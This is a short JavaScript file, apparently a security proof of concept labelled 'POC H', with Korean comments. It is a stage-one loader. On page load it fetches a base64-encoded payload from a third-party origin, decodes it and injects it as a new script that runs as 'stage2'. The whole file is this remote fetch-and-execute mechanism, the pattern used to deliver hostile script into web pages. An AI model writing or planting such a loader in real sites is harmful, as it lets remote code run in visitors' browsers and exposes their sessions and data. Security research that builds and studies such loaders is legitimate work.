(function () {
  function normalizeOrigin(o) {
    return String(o || "").replace(/\/$/, "");
  }

  function normalizeMaybeUpgrade(url) {
    const u = String(url || "");
    if (location.protocol === "https:" && u.startsWith("http://")) {
      return "https://" + u.slice("http://".length);
    }
    return u;
  }

  function getCfg() {
    try {
      return window.__POC_H__ || {};
    } catch {
      return {};
    }
  }

  function getThirdOrigin() {
    try {
      const cfg = getCfg();
      if (cfg.thirdOrigin) return normalizeOrigin(cfg.thirdOrigin);
    } catch {}

    try {
      if (document.currentScript && document.currentScript.src) {
        return new URL(document.currentScript.src).origin;
      }
    } catch {}

    // 최후 fallback
    return location.origin;
  }

  function getPayloadB64Url(thirdOrigin) {
    try {
      const cfg = getCfg();
      if (cfg.payloadB64Url) return normalizeMaybeUpgrade(String(cfg.payloadB64Url));
    } catch {}
    return normalizeMaybeUpgrade(thirdOrigin + "/payload.b64");
  }

  async function run() {
    try {
      const thirdOrigin = getThirdOrigin();
      const url = getPayloadB64Url(thirdOrigin);

      const b64raw = await fetch(url, { cache: "no-store" }).then((r) => r.text());
      const b64 = String(b64raw || "")
        .replace(/^\uFEFF/, "")
        .replace(/[^A-Za-z0-9+/=]/g, "");

      let code;
      try {
        code = atob(b64);
      } catch (e) {
        console.log("[loader] atob failed. payload head:", String(b64raw || "").slice(0, 120));
        throw e;
      }

      const s = document.createElement("script");
      s.id = "pocH_stage2";
      s.setAttribute("data-poc", "H");

      // runtime-config가 없는 환경에서도 payload가 thirdOrigin을 알 수 있게 힌트 남김
      const prefix = `window.__POC_H_THIRD_ORIGIN__=${JSON.stringify(thirdOrigin)};\n`;
      s.textContent = prefix + code;

      (document.head || document.documentElement).appendChild(s);
      console.log("[loader] stage2 executed");
    } catch (e) {
      console.log("[loader] failed:", e && e.message ? e.message : e);
    }
  }

  run();
})();